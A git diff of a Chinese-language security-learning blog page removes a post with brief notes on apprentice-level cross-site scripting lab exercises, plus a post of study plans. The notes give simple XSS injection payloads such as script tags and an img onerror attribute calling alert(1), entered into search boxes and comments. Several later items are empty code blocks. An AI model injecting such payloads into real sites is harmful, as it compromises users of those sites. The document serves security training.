-<h2 id="Cross-site-scripting"><a href="#Cross-site-scripting" class="headerlink" title="Cross-site scripting"></a>Cross-site scripting</h2><h3 id="apprentice-2"><a href="#apprentice-2" class="headerlink" title="apprentice"></a>apprentice</h3><h4 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>直接输入搜索框即可</p>
-<h4 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h4><p>随便点开一个帖子，把alert添加到评论里即可</p>
-<h4 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h4><p>检测为双引号闭合</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>搜索框输入</p>
-<h4 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>还是搜索框</p>
-<h4 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="6-1"><a href="#6-1" class="headerlink" title="6"></a>6</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">#### 7</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#### 8</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#### 9</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#### 10</span><br></pre></td></tr></table></figure>
-<p>```</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/04/27/aaaa/" data-id="clk6k5tlk00032gud949n26ie" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-jihua" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/04/18/jihua/" class="article-date">
-  <time datetime="2023-04-18T08:08:21.000Z" itemprop="datePublished">2023-04-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/04/18/jihua/">2023/04/18：一点大致计划</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="短期内的计划"><a href="#短期内的计划" class="headerlink" title="短期内的计划"></a>短期内的计划</h4><p>-1.改一下打字习惯，一阳指难绷<br>0.参加ctf校内赛，尽力而为吧<br>1.没事刷点lab 先看burp里的<br>2.上c++时顺便把类与对象搞懂<br>3.暑假或别的时候把java python之前速成的洞补一点<br>3.5.然后就可以继续看代码审计的书了<br>4.继续整理之前的题目<br>5.把docker的一点问题解决了<br>6.以及内网渗透开个头</p>
-<h4 id="长期的安排"><a href="#长期的安排" class="headerlink" title="长期的安排"></a>长期的安排</h4><p>没想好先空着</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/04/18/jihua/" data-id="clk6k5tll00052gudg2f7fklq" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -768,7 +835,7 @@ sql99优点：表连接的条件是独立的，连接之后，如果还需要进
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
     </div>
   </div>
 
@@ -781,23 +848,23 @@ sql99优点：表连接的条件是独立的，连接之后，如果还需要进
       <ul>
         
           <li>
+            <a href="/2023/08/10/xssnote/">2023/08/10：xss笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/10/uploadnote/">2023/08/10：upload笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/10/sstinote/">2023/08/10：ssti笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/03/upload-lab/">2023/08/03：upload-lab记录</a>
+          </li>
+        
+          <li>
             <a href="/2023/07/28/sstilab/">2023/7/28：sstilab记录</a>
-          </li>
-        
-          <li>
-            <a href="/2023/07/28/ImaginaryCTF2023/">2023/7/28：ImaginaryCTF2023记录</a>
-          </li>
-        
-          <li>
-            <a href="/2023/07/28/haxonbox/">2023/7/28：hack the box记录</a>
-          </li>
-        
-          <li>
-            <a href="/2023/07/21/xsslab/">2023/7/21：夏令营week2记录:xsslab</a>
-          </li>
-        
-          <li>
-            <a href="/2023/07/16/week1plus/">2023/07/15：夏令营week1记录:出题</a>
           </li>
         
       </ul>
